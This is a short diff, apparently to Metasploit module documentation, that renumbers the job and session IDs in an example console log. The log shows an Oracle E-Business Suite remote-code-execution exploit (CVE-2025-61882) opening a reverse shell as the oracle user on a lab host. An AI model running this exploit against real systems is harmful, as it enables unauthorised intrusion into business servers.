@@ -57,7 +57,7 @@ msf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > check
 
 
 msf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > exploit
-[*] Exploit running as background job 7.
+[*] Exploit running as background job 1.
 [*] Exploit completed, but no session was created.
 
 [*] Started reverse TCP handler on 192.168.56.1:4444 
@@ -77,8 +77,8 @@ msf6 exploit(multi/http/oracle_ebs_cve_2025_61882_exploit_rce) > exploit
 [+] Session created successfully!
 [*] Server stopped.
 [*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.104:61062) at 2025-12-04 09:14:42 +0100
-sessions 7
-[*] Starting interaction with 7...
+sessions 1
+[*] Starting interaction with 1...
 
 id
 uid=54321(oracle) gid=54321(oinstall) groups=54321(oinstall),54322(dba) context=system_u:system_r:initrc_t:s0
